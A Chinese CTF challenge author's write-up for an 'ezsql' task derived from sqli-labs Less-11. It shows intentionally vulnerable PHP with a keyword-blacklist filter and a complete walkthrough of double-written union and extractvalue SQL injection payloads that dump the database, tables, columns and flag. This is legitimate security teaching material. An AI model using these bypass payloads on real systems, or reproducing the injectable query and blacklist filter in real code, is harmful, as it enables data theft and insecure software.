# ezsql

## 出题思路

主要想考查对SQL注入简单过滤的绕过，出题的时候我想尽量修改一些小地方，让网上找的**payload**看似很接近，但实际上要真正理解知识点才能做出来。

题目是从最流行的**sqli-labs**找的，用**sqli-labs-less11**修改而来，前端写的比较拉，主要还是想搞笑。

![](http://pic.bamboo22.top/image/image-20240109213127702.png)

![image-20240109213140783](http://pic.bamboo22.top/image/image-20240109213140783.png)

## 出题过程

在**sqli-labs-less11**的源码基础上修改

````php+HTML
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-1 **Error Based- String**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-1.jpg" /></center>
</body>
</html>
````

前端就不多赘述，主要修改的代码如下：

修改了查询语句，主要是因为修改了数据库，所以查询的库名、表面变了

```php
$sql="SELECT username, trueflag FROM fflllaaaagggg WHERE username='$uname' and trueflag='$passwd' LIMIT 0,1";
```

在输入端增加了过滤，也就是想考察对SQL注入过滤的绕过。

```php
$uname=$_POST['uname'];
	$passwd=$_POST['passwd'];
	$uname = preg_replace("/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|<|>|\^|\|\|/i", '', $uname);
	$passwd = preg_replace("/\*|;|union|select|ascii|mid|ord|substr|like|substring|if|file|extractvalue|updatexml|floor|or|and|#|=|%23|-|<|>|\^|\|\|/i", '', $passwd);

echo 'your Username:';
echo $uname;
echo "<br>";
echo 'your Flag:';
echo $passwd;
```

加了两个正则表达式，并输出过滤后的结果，主要是方便大家看过滤了什么，是否绕过成功

正则很简单，过滤了一些关键字，都可以用双写绕过，原理也很简单，不多赘述。

过滤了注释符，这也是我主要想考的地方，**POST**注入用`#`注释，我把`#`和`%23`都ban了，这里一般都会想到使用万能密码`or '1'='1`这样的语句使SQL语句永真从而执行，来实现注释符的作用。

举个例子，一般的SQL注入的语句

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

当我拼接上查库的操作`-1' union select 1,2,database() or '1'='1`

```php
$sql="SELECT * FROM users WHERE id='-1' union select 1,2,database() or '1'='1' LIMIT 0,1";
```

可以发现最后的语句变成了`or '1'='1'`这个永真的式子，前面的SQL语句执行，从而达到注释符的作用。



**在本题中，我们查询的语句有两个，坑也在此埋下：**

当我们查询到数据库名时，用`oorr '1'='1`来结尾（这里其实ban了`=`,但是不影响注释效果，只要有右边`'`就行）

```
1' ununionion selselectect database(),2 oorr '1'='1
```

当在**Username**框中查询时，

<img src="http://pic.bamboo22.top/image/image-20240109232346348.png" alt="image-20240109232346348" style="zoom:80%;" />

会报错`Unknown column 'trueflag' in 'field list'`报错了，直接把我的字段名给爆出来了:sob:但是我没有改，就算知道我的字段名你也注不出来

如果我们换成在**Flag**框中查询时，发现成功了，库名被爆出来了

![image-20240109220703457](http://pic.bamboo22.top/image/image-20240109220703457.png)

看起来很玄，我们来分析一下源码,我将过滤后的语句拼接上去

在**Username**中输入：

```php
$sql="SELECT username, trueflag FROM fflllaaaagggg WHERE username='1' union select database(),2 or '1' like '1' and trueflag='$passwd' LIMIT 0,1";
```

推测一波：前面的语句应该被正常执行，但是，后面还有一个**and**，**and**后面的内容也会被执行，`$passwd`参数中没有输入，于是**and**后面的内容执行错误，报错`Unknown column 'trueflag' in 'field list'`

在本地的数据库中测试，可以看到第一次就是我们后台的SQL查询语句，报错，第二次我们删除**and**后面的内容，查询正常，证实了我们的猜想。

<img src="http://pic.bamboo22.top/image/image-20240109222206092.png" alt="image-20240109222206092" style="zoom:50%;" />

<img src="http://pic.bamboo22.top/image/image-20240109222230002.png" alt="image-20240109222230002" style="zoom:40%;" />

所以我们的所以查询语句都要在**Flag**框中才能达到我们想要的效果

继续往下进行注入,你应该不难翻出你的笔记，拼出如下查询语句

```
1' ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit' oorr '1' = '1
```

![image-20240109222644840](http://pic.bamboo22.top/image/image-20240109222644840.png)

然后发现第一位是回显第二位不是回显位，所以我们应该将查询语句放到第一位

```
1' ununionion selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit' ,2 oorr '1' = '1
```

如果你这样修改，那恭喜你，又进坑了，报错了

![image-20240109223026285](http://pic.bamboo22.top/image/image-20240109223026285.png)

报错的原因很简单，`union select 1,2 #`联合查询的语句，但是语句中用空格，分不清查询的两个东西了，所以说得加括号`()`

````
1' ununionion selselectect(selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit'),2 oorr '1' = '1
````

这样就ok了

走到这里应该就没什么大问题了，之后就是常规操作了

当然报错注入也是可以的，我试过，这里就留给师傅们自己测了。



## 完整WP

```
1' ununionion selselectect database(),2 && '1'lilikeke'1      #查库

1' ununionion selselectect (selselectect group_concat(table_name) from infoorrmation_schema.tables where table_schema lilikeke 'flaginit'),2 && '1' = '1
                                                              #查表
1' ununionion selselectect (selselectect group_concat(column_name) from infoorrmation_schema.columns where table_name lilikeke 'fflllaaaagggg'), 2 && '1' = '1
                                                              #查列
1' ununionion selselectect (selselectect group_concat(trueflag) from flaginit.fflllaaaagggg), 2 && '1' = '1                                                 #查数据


1' ununionion selselectect extraextractvaluectvalue(1,concat(0x7e,(selselectect group_concat(trueflag)from fflllaaaagggg))),2 && '1' = '1     #报错
```







## 总结

之前没什么出题经验，这个**ezsql**本来以为难度不大，但是最后只有一解，让我反思是不是题目有什么刁钻的地方，于是重新分析了一下题目，写了这篇出题思路，从中也有所收获。

首先当然是要理解基础的知识点，这道题不知道师傅们都卡在了哪一步，不知道上述讲的点是否囊括了所以容易卡住的地方，但是仔细去看这些地方，其实都是我们没有掌握牢固的知识点，所以基础知识很重要。其次就是SQL注入这样的复杂环境应该多去尝试、注入点、注入姿势、等等。

其实在出题时我也没有去研究这些可能卡主的地方，在结束后反思又学到了一些东西，所以做题的反思也很重要。